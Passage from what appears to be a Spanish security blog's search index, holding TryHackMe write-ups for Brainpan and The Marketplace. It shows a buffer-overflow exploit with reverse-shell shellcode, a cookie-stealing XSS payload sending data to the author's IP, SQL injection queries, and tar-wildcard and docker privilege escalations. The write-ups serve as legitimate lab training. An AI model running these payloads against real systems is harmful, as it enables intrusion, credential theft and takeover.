&quot;\\x4a\\xf7\\x65\\x94\\x78\\x58\\xde\\x32\\x31\\x11\\xf8\\xc5&quot; command += &quot;\\x36\\x08\\xbc\\x59\\xc9\\xb3\\xbd\\x70\\x0e\\xe7\\xed\\xea&quot; command += &quot;\\xa7\\x88\\x65\\xea\\x48\\x5d\\x29\\xba\\xe6\\x0e\\x8a\\x6a&quot; command += &quot;\\x47\\xff\\x62\\x60\\x48\\x20\\x92\\x8b\\x82\\x49\\x39\\x76&quot; command += &quot;\\x45\\xb6\\x16\\xfc\\x15\\x5e\\x65\\xfc\\x14\\x24\\xe0\\x1a&quot; command += &quot;\\x7c\\x4a\\xa5\\xb5\\xe9\\xf3\\xec\\x4d\\x8b\\xfc\\x3a\\x28&quot; command += &quot;\\x8b\\x77\\xc9\\xcd\\x42\\x70\\xa4\\xdd\\x33\\x70\\xf3\\xbf&quot; command += &quot;\\x92\\x8f\\x29\\xd7\\x79\\x1d\\xb6\\x27\\xf7\\x3e\\x61\\x70&quot; command += &quot;\\x50\\xf0\\x78\\x14\\x4c\\xab\\xd2\\x0a\\x8d\\x2d\\x1c\\x8e&quot; command += &quot;\\x4a\\x8e\\xa3\\x0f\\x1e\\xaa\\x87\\x1f\\xe6\\x33\\x8c\\x4b&quot; command += &quot;\\xb6\\x65\\x5a\\x25\\x70\\xdc\\x2c\\x9f\\x2a\\xb3\\xe6\\x77&quot; command += &quot;\\xaa\\xff\\x38\\x01\\xb3\\xd5\\xce\\xed\\x02\\x80\\x96\\x12&quot; command += &quot;\\xaa\\x44\\x1f\\x6b\\xd6\\xf4\\xe0\\xa6\\x52\\x14\\x03\\x62&quot; command += &quot;\\xaf\\xbd\\x9a\\xe7\\x12\\xa0\\x1c\\xd2\\x51\\xdd\\x9e\\xd6&quot; command += &quot;\\x29\\x1a\\xbe\\x93\\x2c\\x66\\x78\\x48\\x5d\\xf7\\xed\\x6e&quot; command += &quot;\\xf2\\xf8\\x27&quot; payload = offset + eip + nops + command try: s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.settimeout(5) s.connect((ip_addr, port)) data = s.recv(1024) print(&quot;[*] Enviando payload...&quot;) s.send((payload).encode(&#39;latin1&#39;)) data = s.recv(1024) except: print(&quot;\\n [!] Ocurrio un error!&quot;) sys.exit(1)Si re-abrimos el servicio brainpan.exe en nuestra maquina de prueba (sin utilizar el Immunity Debugger para que no pause la ejecucion) y ejecutamos el ./bofexploit.py 192.168.132.131 9999 mientras en otra ventana hacemos un sudo nc -nlvp 443 para escuchar con netcat el puerto en espera de una consola remota, observamos como se realiza la explotacion de la vulnerabilidad de desbordamiento de bufer para ganar acceso inicial a nuestro sistema de prueba:Ahora solo falta adaptar este exploit al sistema Linux en el que esta basado la maquina original de TryHackMe, para ello cambiaremos el payload del msfvenom a linux/x86/shell_reverse_tcpcon la siguiente ejecucion:msfvenom -p linux/x86/shell_reverse_tcp -a x86 -f python -v command LHOST=10.8.33.130 LPORT=443 -b &#39;\\x00&#39; -e x86/shikata_ga_naiDe igual forma copiamos el texto en nuestro script, abrimos una instancia de nc y ejecutamos el exploit ahora contra la IP de la maquina de TryHackMe y ganamos acceso con una consola no muy interactiva:Con esto podremos completar nuestro segundo objetivo de la maquina…ESCALADA DE PRIVILEGIOSUna vez tenemos acceso, lo primero que podemos hacer es obtener una consola mas interactiva haciendo uso de una serie de pasos que se explican a continuacion: script /dev/null -c bash En teclado Ctrl + Z stty raw -echo; fg Escribir reset aunque no se vea xterm en Terminal Type export SHELL=bash export TERM=xtermYa con esto tenemos una consola interactiva con la cual procedemos a seguir investigando en como ganar privilegios de root. En un principio entramos como el usuario puck pero al escribir sudo -l vemos que podemos ejecutar el paquete /home/anansi/bin/anansi_util como root sin proveer password:Asi que ejecutamos el comando haciendo sudo /home/anansi/bin/anansi_util vemos una serie de opciones, probamos con: sudo /home/anansi/bin/anansi_util manual catY vemos que nos abre un manual del tipo man o less, pero al estar ejecutando esto como root podemos facilmente escribir !/bin/bash para escapar del less y ejecutar comandos desde alli, y finalmente esto nos abrira una consola bash con permisos de root:Con esto completamos el ultimo objetivo de nuestra maquina explotando exitosamente una vulnerabilidad de buffer overflow en ambos entornos Windows y Linux…Saludos!" }, { "title": "The Marketplace - THM Writeup", "url": "/posts/the-marketplace-thm-writeup/", "categories": "cajas", "tags": "thm, xss, web, docker", "date": "2022-01-07 22:55:30 +0000", "snippet": "En el campo de la ciberseguridad, el realizar las pruebas en competencias del tipo Captura la bandera o CTF nos ayuda a comprender los conceptos claves sobre aquellas vulnerabilidades que pudiesen estar presentes en un entorno empresarial.TryHackMe es una de esas plataformas donde presentan maquinas en la nube virtualizadas con las cuales se puede practicar las auditorias de ciberseguridad en entornos controlados.El dia de hoy se presenta una guia o Writeup en el cual se explica la metodologia de trabajo a seguir para lograr obtener las Flags necesarias para completar este reto.Para ello empezaremos logeandonos en TryHackMe con nuestras credenciales, vamos al apartado de Learn y desde ahi usamos el buscador para encontrar nuestra maquina llamada The Marketplace con la siguiente descripcion:The sysadmin of The Marketplace, Michael, has given you access to an internal server of his, so you can pentest the marketplace platform he and his team has been working on. He said it still has a few bugs he and his team need to iron out. Can you take advantage of this and will you be able to gain root access on his server?Aunque no parezca de gran importancia, al tener esta descripcion ya debemos de tomar en cuenta que es posible que exista el usuario michael en el sistema.Una vez logeados, procedemos a iniciar la maquina y agregarle 1 hora mas por si acaso, luego nos conectamos al VPN con sudo openvpn /PATHTO/USER.ovpny empezamos…RECONOCIMIENTOPara empezar nuestro reconocimiento, ya sabemos que esta maquina es Linux pero podriamos averiguarlo al hacer ping -c 1 IPMAQUINA y ver si el TTL del paquete esta cercano a 64 (Linux) o a 128 (Windows), luego procederemos a hacer un escaneo completo de todos los puertos TCP utilizando NMap con ciertas opciones que nos ayudaran a identificar mejor los puertos que de verdad se quieren obtener, para ello utilizamos el siguiente comando nmap -p- --open -T5 -n -v 10.10.134.243 -oN puertos.txtDonde se especifican los 65535 puertos TCP con -p-, se obtienen solo los puertos con estado --open, se utiliza la maxima velocidad de escaneo con -T5, se evita el uso de DNS con -n, se utiliza el verbose con -v para ver los puertos que se vayan encontrando, y finalmente se extrae la salida del escaneo a un archivo con -oN puertos.txtCon esto nos encontramos con la siguiente salida:Donde se pueden observar que tenemos los puertos TCP abiertos 22,80,32768Procedemos a seguir enumerando con mas detalle estos puertos que fueron encontrados abiertos, haciendo uso de otras opciones de NMap para usar scripts de enumeracion por defecto con -sC y detectando la version de los protocolos abiertos con -sV nmap -sC -sV -p22,80,32768 10.10.134.243 -oN version.txtNos topamos con la siguiente informacion:Vemos que existen dos paginas http tanto en el puerto 80 como en el 32768, para ellas dos vamos a utilizar el paquete whatweb para obtener informacion extra de estas: whatweb http://10.10.134.243 http://10.10.134.243:32768 | tee whatweb.txtCon tee hacemos que la salida del programa se muestre en consola y al mismo tiempo se cree un archivo con el mismo contenido, tenemos lo siguiente:A este punto podemos abrir el navegador web y abrir la pagina del puerto 80 primero, y ahi utilizar la extension Wappalyzer que nos dara mas o menos la misma informacion obtenida por whatweb como sigue:Ya con la informacion que tenemos, se puede empezar con la siguiente etapa…ESCANEOCon la informacion obtenida anteriormente, tenemos tres puertos con los cuales podemos iniciar a probar vectores de ataque.Para el puerto 22 SSH no hay mucho que hacer pues no disponemos de credenciales y al probar credenciales por defecto no logramos acceso, pasamos a probar la pagina web del puerto 80 HTTP a ver que encontramos.Al entrar en la pagina nos topamos con un cierto estilo de catalogo de objetos, pero lo interesante es que vemos un panel de Log in y Sign up, es altamente recomendable antes de empezar a probar cualquier cosa, registrarse en la pagina (y esto aplica siempre que exista un apartado de registro) para revisar el funcionamiento y ver que se puede lograr siendo un usuario basico recien registrado.Una vez logeados, hemos obtenido una Cookie de sesion llamada token que no existia antes, y con EditThisCookie podemos ver y alterar su valor, con lo cual podemos tener en cuenta de que podriamos explotar un posible Cookie HijackingPor ahora no podemos hacer nada, asi que seguimos, y vemos que se pueden crear nuevos objetos en el catalogo que aparece al inicio donde tenemos un formulario para Titulo, Descripcion y un sospechoso apartado para subir archivos que esta desactivado segun por razones de seguridad:Podriamos intentar saltarnos la desactivacion del boton usando el mismo codigo fuente de la paginaPero luego de diferentes pruebas, el boton parece no tener efecto a pesar de tener cargado un archivo, asi que suponemos el deshabilitado de subidas fue hecho tambien en el codigo lo cual dificultaria la evacion de esta restriccion.Siguiendo adelante, crear el nuevo objeto, la misma pagina nos redirecciona a este:Aca vemos que existen opciones adicionales para contactar al creador del objeto, y ademas una opcion que nos permite Reportar el objeto al equipo de administradores de la pagina, una vez reportado el objeto recibimos un mensaje de que un administrador revisara si existe una regla y nos devolvera un mensaje con el resultado.Pasado un corto tiempo, al revisar los mensajes nuevamente, vemos que un administrador efectivamente abrio el objeto listado y nos devolvio un mensaje diciendo que no hay nada que viole los reglamentosSi el administrador abre efectivamente la publicacion del objeto, esto nos indica un posible vector de ataque de Cross-Site Request Forgery (XSRF) donde se aprovecha de que un usuario privilegiado acceda a un recurso “malicioso” otorgado por un usuario no-privilegiado con fines cuestionables.Para ello probaremos si algunos de los formularios para crear un nuevo objeto son vulnerables a Cross Site Scripting (XSS) y podemos ejecutar codigo HTML o JS en el mismo.Esto lo podemos hacer de muchisimas formas pero aca va una lista de las mas comunes a probar:&amp;lt;h1&amp;gt;Encabezado&amp;lt;/h1&amp;gt;&amp;lt;marquee&amp;gt;Texto moviendose&amp;lt;/marquee&amp;gt;&amp;lt;script&amp;gt;alert(&#39;Alerta emergente&#39;)&amp;lt;/script&amp;gt;Al probar el etiquetado &amp;lt;script&amp;gt; vemos que efectivamente el sitio es vulnerable a XSS y los scripts si pueden ser ejecutados y forjados:Ya que sabemos que podemos introducir scripts dentro de los objetos que creamos, y sabemos que podemos hacer reporte a los admins para que ellos abran forzadamente estos objetos, podemos pensar en maneras de robarles la cookie de sesion y asi tener un acceso privilegiado a traves del robo de ese token.Para esto podriamos hacer uso del objeto document presente en JavaScript y aprovecharnos de la propiedad .cookie de este mismo para poder leer las Cookies de la persona que ejecuta el script.Si en vez de pasar texto a la funcion alert() pasamos la propiedad document.cookie del modo&amp;lt;script&amp;gt;alert(document.cookie)&amp;lt;/script&amp;gt;Y lo introducimos dentro del campo Descripcion del objeto, al abrir este objeto nos topamos con una alerta emergente con nuestra Cookie de sesion actual:Ahora bien, nuestro interes es de cierta forma remotamente obtener la Cookie del administrador, pero mostrarlo en una alerta emergente para el no nos servira de mucho, asi que debemos pensar una forma de obtener esa informacion en nuestro extremo y lograr nuestro Cookie Hijacking a ver que privilegios logramos.Una de estas formas es hacer un script que intente hacer una peticion GET a un servidor web nuestro y agregar de alguna forma la Cookie actual en algun campo de esta peticion GET. Esto se logra facilmente si nos montamos un servidor web local con Python a traves de un modulo que trae por defecto llamado http.server, lo montamos de la siguiente forma: sudo python -m http.server 80Ya con esto tenemos un servidor activo en el puerto 80 de nuestra IP, el cual nos mostrara las peticiones en pantalla. De esta forma si creamos un nuevo objeto en el Marketplace y utilizamos el siguiente tag en el campo de Descripcion&amp;lt;img src=&quot;http://10.8.33.130/image.jpg&quot;&amp;gt;&amp;lt;/img&amp;gt;Vemos que esta tag intentara poner una imagen proveniente de nuestra IP 10.8.33.130 (asignada en la interfaz tun0 proporcionada por el openvpn) pero dicha imagen no existe, sin embargo en la consola logramos ver la peticion de igual manera:Ahora hay que buscar una forma de agregar la Cookie a esta peticion, para ello podriamos hacer uso de otra propiedad del objeto document llamada .write la cual escribe dentro de la salida del HTML en si, y con el siguiente script podemos precisamente agregar la cookie al final de la peticion que hicimos en la imagen:&amp;lt;script&amp;gt;document.write(&#39;&amp;lt;img src=&quot;http://10.8.33.130/image.jpg?&#39; + document.cookie + &#39;&quot;&amp;gt;&amp;lt;/img&amp;gt;&#39;)&amp;lt;/script&amp;gt;Analizando el script, vemos que es la misma peticion &amp;lt;img src=&quot;http://10.8.33.130/image.jpg&quot;&amp;gt;&amp;lt;/img&amp;gt; pero se le agrego ?token=xxxxxxxxxxxxxx a traves de concatenacion lograda por el metodo document.write presente en JavaScript.Si creamos nuevamente un objeto dentro del Marketplace con el script fabricado arriba, veremos la respuesta en consola al hacer la peticion por la imgA pesar de seguir respondiendo con un codigo 404 imagen no existente, igual podemos ver la Cookie de sesion (en este caso de nuestra propia cuenta que creamos).Ahora bien, este objeto creado en Marketplace enviara la peticion junto con la Cookie a nuestro servidor de cualquier persona que abra este item, y sabemos que los admins abren estos objetos al ser reportados, sabiendo esto pasaremos a reportar este mismo objeto a ver si un admin lo abre y podemos robar su Cookie de sesion.El servidor web fue re-lanzado para tener una consola limpia, y vemos que efectivamente hemos recibido una Cookie de sesion al enviar el reporte (esperando que sea la de admin), si luego con nuestro EditThisCookie cambiamos nuestra Cookie actual a esta que hemos recibido:Al presionar F5 o recargar la pagina, notamos que aparece un nuevo boton llamado Administration panel presente en las opciones de la pagina, cosa que no salia anteriormente.Y al entrar nos encontramos con nuesta primera flag y una lista de usuarios registrados en el sitio:Comprobamos que efectivamente existe un usuario para michael. Al hacer click en cualquiera de estos usuarios nos lleva a otra pagina donde nos muestra ciertos atributos de ese usuario, sin embargo de la forma en que la muestra, pareciera estar obteniendo valores de una Base de Datos por como obtenemos los mismos atributos al solo cambiar el ID del usuario en la URL:Con ello, probando insertar una sola comilla en el campo ?user=1 de la URL, vemos que efectivamente estamos ante un MySQL y la entrada del usuario no esta sanitizada para prevenir SQL InjectionPor lo tanto, procedemos a hacer pasos para enumerar las bases de datos existentes a traves de SQL Injection: Encontrar cantidad de columnas mostradas:Lo primero que debemos hacer es encontrar la cantidad de columnas que se muestran en la pagina, mas adelante se explica el por que debemos hacer este paso.Existen varias formas de lograr esto, pero la mas comun es usando la instruccion ORDER BY # (añadiendo ;-- - para finalizar la instruccion con ; y comentar el resto de la linea -- - que existiese dentro del codigo fuente) de MySQL, a esta instruccion le presigue un numero que debemos probar hasta que nos arroje error, al momento de arrojar error significa que el numero usado es efectivamente mayor que la cantidad de columnas existentes en la tabla actual, por lo cual nos quedamos con el numero anterior, ejemplo: http://10.10.134.243/admin?user=1 ORDER BY 5;-- -Al usar el numero 5 nos arroja un error con el cual podemos presumir que el numero real de columnas es 4 y no 5, ya que ni con 4 ni 3 ni 2 ni 1 da error.Otra opcion sera la de usar directamente los numeros separados por comas para asi tener una respuesta mas rapida, a cuesta del tiempo que tardamos en introducir la cantidad de numeros a probar como: http://10.10.134.243/admin?user=1 ORDER BY 1,2,3,4,5,6,7,8,9,10;-- -Con esto recibiremos exactamente el mismo error anterior, indicando falla en encontrar la columna 5, es decir que existen solo 4 de ellas. Implantar campos de prueba en tablas mostradas:Lo que viene es hacer uso de la instruccion UNION para unir la tabla existente y una falsa tabla que nos crearemos con el fin de poder ver en al menos un campo, el resultado de las peticiones que haremos mas adelante.Para esto debemos añadir UNION SELECT 1,2,3,4;-- - al final de la peticion, recordando que ahora sabemos que son 4 la cantidad de columnas existentes. Si se intenta esto a pesar de no obtener error, nuestro interes final es que aparezca los numeros introducidos (1, 2, 3 o 4) en algun campo de la pagina, sin embargo esto no pasa y es porque la cantidad de elementos a mostrar esta delimitada, para evitar esto cambiamos el valor que realmente es comparado en la base de datos (user=1) por algun otro que no exista, puede ser cualquiera mayor a 3 (ya que 3 es el ID de nuestro usuario creado, el usuario con ID 4 no existe, ni ningun otro numero mayor), pero lo mas comun usado en SQL Injection es cambiarlo y poner -1 en cambio (user=-1) y asi dejar los cambios limpios para que nuestra otra tabla pase a tomar estas posiciones en la pagina: http://10.10.134.243/admin?user=-1 UNION SELECT 1,2,3,4;-- -En la imagen los valores luego del SELECT fueron cambiados a ...admin?user=-1 UNION SELECT &#39;a&#39;,&#39;b&#39;,&#39;c&#39;,&#39;d&#39;;-- - para mostrar de mejor manera en que posiciones se introducen estos nuevos valores, con eso en mente, procederemos a inyectar valores dentro del cambio &#39;b&#39; o 2 para efectos practicos. Obtener nombres de bases de datos:Para leer especificamente los nombres de Bases de Datos en MySQL, existe una tabla en donde estos son almacenados en una base de datos interna por defecto llamada information_schema el cual tiene mucha informacion de interes para un atacante (mas aqui), especificamente buscamos el valor schema_name dentro de la tabla schemata de la base de datos information_schema, asi que procedemos a crear la siguiente consulta haciendo uso de la funcion group_concat() el cual nos lista multiples valores en uno solo separados por coma: http://10.10.134.243/admin?user=-1 UNION SELECT 1,group_concat(schema_name),3,4 FROM information_schema.schemata;-- -Vemos que existen solo dos bases de datos, information_schema que siempre esta presente, y marketplace que es de nuestro interes Obtener nombres de tablas:Para seguir indagando hacia abajo, podemos leer los nombres de las tablas dentro de las bases de datos haciendo uso de la tabla table_name dentro de information_schema sabiendo que el table_schema es marketplace, por lo tanto preparamos la siguiente consulta: http://10.10.134.243/admin?user=-1 UNION SELECT 1,group_concat(table_name),3,4 FROM information_schema.tables WHERE table_schema=&#39;marketplace&#39;;-- -Esto nos devuelve tres tablas con items, messages, y users Obtener nombres de atributos:En este caso nos enfocaremos en la tabla messages ya que al parecer es la unica que tiene informacion de interes. A continuacion buscaremos obtener los valores de column_name dentro de information_schema sabiendo que el table_name es messages, queda la siguiente consulta: http://10.10.134.243/admin?user=-1 UNION SELECT 1,group_concat(column_name),3,4 FROM information_schema.columns WHERE table_name=&#39;messages&#39;;-- -Esto nos devuelve los valores de id, is_read, message_content, user_from, user_to. Con esta informacion ya concluimos que nuestros valores de interes son message_content, user_from, user_to para los cuales intentaremos recuperar todos sus valores desde la tabla messages con la siguiente consulta: http://10.10.134.243/admin?user=-1 UNION SELECT 1,group_concat(user_from,0x3a,user_to,0x3a,message_content),3,4 FROM messages;-- -Como vemos arriba, no hace falta especificar la base de datos ya que se asume estamos trabajando dentro de ella, de igual forma es valido poner el formato full con marketplace.messages, tambien hemos utilizado 0x3a dentro de la instruccion group_concat() que representa el simbolo de dos puntos : en hexadecimal, para separar los diferentes valores que nos encontramos.Con la informacion obtenida, vamos de vuelta a nuestra consola y utilizamos el paquete tr &#39;,&#39; &#39;\\n&#39; para reemplazar las comas que se usan para separar los atributos en saltos de linea y sean mas facil de leer:Vemos que el usuario 1 (admin) le envio al usuario 3 (jake) una clave temporal de SSH que es @b_ENXkGYUCAv3zJ, la guardamos por si acasoY al probar logearnos en SSH con esa clave, funciona perfecta ssh jake@10.10.134.243La IP de la maquina cambio pero el procedimiento sigue siendo el mismo, ya con esto se logra el acceso al server y tenemos nuestra Flag de user.txt que se encuentra dentro de /home/jake/user.txtESCALADA DE PRIVILEGIOSUna vez dentro y logeados como jake aun no tenemos permisos de root por lo tanto nos falta aun la bandera root.txt que deberia estar dentro de /root/. Pasamos a revisar y nos damos cuenta que al ver los privilegios sudoers con sudo -l tenemos permisos como michael de ejecutar el script en bash /opt/backups/backup.sh, el cual haciendo un cat podemos ver su funcionamiento:Vemos que el script usa el comando tar para comprimir todos los archivos del sistema usando el wildcard *, este wildcard supone un riesgo de seguridad, debido a que si lee todos los archivos, si un archivo tiene de nombre una opcion de comando (ejemplo: un archivo llamado --help), el programa en vez de leerlo como archivo, lo ejecuta como opcion adicional de sus propios argumentos. Esto se conoce como Wildcard Injection.Segun GTFOBins - tar podemos explotar esta vulnerabilidad si añadimos --checkpoint=1 --checkpoint-action=exec=bash como argumentos de un comando tar, en este caso debemos crear dos archivos llamados --checkpoint=1 y --checkpoint-action=exec=bash en un directorio donde tengamos permisosComo vemos existen varias formas de crear archivos que empiecen con guiones. Una vez creados estos archivos, pasamos a ejecutar el script en bash a ver si obtenemos una consola con privilegios de michael:Efectivamente al ejecutar el comando haciendo uso de la opcion -u michael para que el sudo lo haga como michael y no como root (que igual no tenemos permisos) obtenemos una consola con el usuario de michael, y justamente al ver su id vemos que pertenece al grupo de docker.Aca nuevamente segun GTFOBins - docker podemos aprovecharnos de estar adentro del grupo de docker para crear un contenedor y poder montar dentro de el los archivos que no podriamos leer aun debido a falta de permisos, para ello primero vemos que imagenes existen instaladas para los contenedores con: docker imagesY vemos que existe la imagen alpine que es un entorno muy ligero y nos puede servir perfectamente para lo que se necesita. Ultimadamente vamos a montar un docker con las siguientes opciones: docker run -v /:/mnt --rm -it alpine chroot shQue con uso de la funcion run montara el docker alpine de modo interactivo -it, creando el volumen -v metiendo todo lo que esta en / dentro : de /mnt, removera el docker una vez salgamos con --rm y finalmente ejecutara el comando sh el cual nos da una shell.Con esto hemos entrado dentro del docker alpine y tenemos permisos de usuario root dentro de este entorno, sin embargo notamos que no estan los archivos de la maquina, y en /root/ no hay nada, esto pasa porque hemos de recordar que el sistema de archivos de / lo hemos montado dentro de /mnt/Con esto finalmente logramos la bandera de root.txt y hemos efectivamente completado esta maquina a traves de XSS, XSRF, SQL Injection y Wildcard Injection.Se espera que los conceptos presentes en esta maquinas hayan sido explicados correctamente y se puedan entender los procedimientos para explotar las vulnerabilidades presentes en The Marketplace, muchisimas gracias por tomarse el tiempo de leer este Writeup y se le invita a estar pendiente para nuevas guias.Saludos!" } ]
